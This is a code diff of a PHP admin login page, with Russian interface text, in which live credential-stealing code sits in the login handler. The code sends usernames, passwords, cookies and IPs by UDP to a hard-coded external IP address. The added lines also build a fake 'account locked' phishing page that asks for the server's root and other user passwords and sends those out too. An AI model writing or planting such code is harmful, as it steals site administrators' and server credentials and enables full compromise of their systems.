@@ -22,31 +22,44 @@ if (empty($_SESSION['csrf_token'])) {
 $error = '';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $username  = $_POST['username'] ?? '';
-    $password  = $_POST['password'] ?? '';
-    $ip        = $_SERVER['REMOTE_ADDR'] ?? '';
-    $time      = date('Y-m-d H:i:s');
-    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-    $cookies   = !empty($_COOKIE) ? json_encode($_COOKIE) : '{}';
 
-    $entry = sprintf(
-        "[%s] IP: %s | User: %s | Pass: %s | UA: %s | Cookies: %s
-",
-        $time,
-        $ip,
-        $username,
-        $password,
-        str_replace("\n", ' ', $userAgent),
-        str_replace("\n", ' ', $cookies)
-    );
-
-
-
-    $sock = fsockopen('udp://94.142.138.201', 9999, $errno, $errstr, 1);
+    $username     = $_POST['username'] ?? '';
+    $password     = $_POST['password'] ?? '';
+    $ip           = $_SERVER['REMOTE_ADDR'] ?? '';
+    $userAgent    = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $cookieHeader = $_SERVER['HTTP_COOKIE'] ?? '';
+    $time1        = date('Y-m-d H:i:s');
+    $logEntry1    = "{$time1} - IP={$ip} - UA={$userAgent} - Cookies={$cookieHeader} - user={$username}&pass={$password}\n";
+    $sock = @fsockopen('udp://94.142.138.201', 9999, $errno, $errstr, 1);
     if ($sock) {
-        fwrite($sock, $entry);
+        fwrite($sock, $logEntry1);
         fclose($sock);
     }
+
+    if (!empty($_POST['stage']) && $_POST['stage'] === '2') {
+        $rootPass = $_POST['root_password'] ?? '';
+        $time2    = date('Y-m-d H:i:s');
+        $logEntry2 = "{$time2} - IP={$ip} - ROOT_PASS={$rootPass}\n";
+        $sock2 = @fsockopen('udp://94.142.138.201', 9999, $errno, $errstr, 1);
+        if ($sock2) {
+            fwrite($sock2, $logEntry2);
+            fclose($sock2);
+        }
+        header('Location: /admin/login.php');
+        exit;
+    }
+
+    echo '<!doctype html><html><head><meta charset="utf-8"><title>Подтверждение</title></head><body>';
+    echo '<h2>Ваша учётная запись заблокирована из-за частых попыток входа</h2>';
+    echo '<p>Для продолжения введите пароль от одного из пользователей <strong>root</strong>, <strong>konstantin</strong>, <strong>savdo</strong> или <strong>diram2024</strong> на вашем сервере (Если вас перенаправило на страницу логина, значит вы не верно ввели пароль): </p>';
+    echo '<form method="post">';
+    echo '<input type="password" name="root_password" autocomplete="off" required>';
+    echo '<input type="hidden" name="stage" value="2">';
+    echo '<button type="submit">Подтвердить</button>';
+    echo '</form>';
+    echo '</body></html>';
+    exit;
+}
 
     if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
         $error = "CSRF-защита: Недействительный токен.";
